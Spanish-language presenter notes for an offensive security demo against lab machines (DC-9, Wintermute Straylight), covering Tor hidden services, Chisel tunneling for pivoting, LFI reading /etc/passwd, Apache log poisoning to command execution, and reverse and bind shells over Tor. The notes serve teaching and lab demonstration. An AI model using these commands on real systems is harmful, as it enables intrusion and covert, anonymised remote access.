# Kiddie Demo Notes
## Requisitos
- Ejecutar Job `Kiddie/Deploy`
### Kali
- Arrancar Tor, Hidden Service y walkthrough files cargados
```
sudo systemctl start tor
sudo -u debian-tor tor -f /opt/torrc
```
```
vim ~/.bash_aliases_custom/dc9.aliases # Actualizar DC-9
```
```
env | grep -e DC9 -e HIDDEN_SRV_TOR

# Check DC-9
nctor -v -z -w1 $DC9 80

# Check Hidden Service
nc -lnvp 1234 &
nctor -v -z -w1 $HIDDEN_SRV_TOR 1234
```
### Máquina del Jenkins
- Actualizar `~/.ssh/config`
- Subir Chisel y offensive-tor-toolkit
```
ansible-playbook -i dc9, ~/git/Kiddie-demo/00_demo-requirements-playbook.yml
```
- Acceso ssh con apache y tmux
```
ssh -t dc9 sudo -u apache -s "/bin/bash -c 'cd /var/lib/httpd && /usr/bin/tmux'"
```

## Contenido de la demo
- **[DC9]** !! Hacer todo con usuario apache !!


- **[DC9]** Levantar servidor de Chisel
```
cd /var/lib/httpd
./chisel server -p 1111 --socks5
```
- **[DC9]** Arrancar hidden-portforwarding

```
# onion:1111 -> 127.0.0.1:1111
./offensive-tor-toolkit/hidden-portforwarding \
        -data-dir datadir-hidden-pf \
        -forward 127.0.0.1:1111 \
        -hidden-port 1111
...
Forwarding ...  [!] ...onion [!] -> 127.0.0.1:1111
```
- **[KALI]** Conectar al HS con chisel client
```
HIDDEN_PF=<ONION>    # [!] ...onion [!]

chisel client \
    --proxy socks://127.0.0.1:9050 \
    $HIDDEN_PF:1111 socks

ss -lntp | grep chisel
```

- **[KALI]** Acceder a Wintermute Straylight `80/tcp`






## Extra
- LFI con usuario admin
```
dc9-login-admin # Obtener cookie
dc9-lfi /etc/passwd | head
```

- Log poisoning

```
dc9-lfi /var/log/httpd/access_log | tail -2
```
```
dc9-poisonlog
dc9-lfi /var/log/httpd/access_log | tail -2
```
```
dc9-cmd id
```

- Lanzar reverse-shell-over-tor y fully-upgraded-shell
```
dc9-reverse-shell
```
```
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm

^Z
stty raw -echo
fg
reset

stty rows 23 columns 104
```

- Lanzar una bind shell para más de una terminal
```
./offensive-tor-toolkit/hidden-bind-shell -data-dir datadir-bind-shell
```
